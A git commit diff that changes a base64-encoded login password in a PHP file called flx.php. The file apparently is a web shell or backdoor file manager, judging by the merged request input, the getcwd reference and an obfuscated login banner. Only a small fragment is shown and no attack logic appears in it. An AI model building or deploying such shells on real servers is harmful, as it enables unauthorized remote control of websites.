3c1716bb922f316f3a6ede182743c24325f24d07
AzhariKun <76898637+AzhariKun@users.noreply.github.com>
2023-06-24 13:51:45 +0700

    Update flx.php

--- flx.php
+++ flx.php
@@ -11,7 +11,7 @@ date_default_timezone_set("Asia/Jakarta");
 $_7 = array_merge($_POST, $_GET);
 $_r = "required='required'";
 $gcw = "getcwd";
-$inipass = "Zmx1eGk=";
+$inipass = "Z2FrYWRhNDA0";
 if(isset($_7['_'])){
 	echo "<div class='text-center text-muted'>login{0};n7z{l+cu,};z7u</div>";
 }
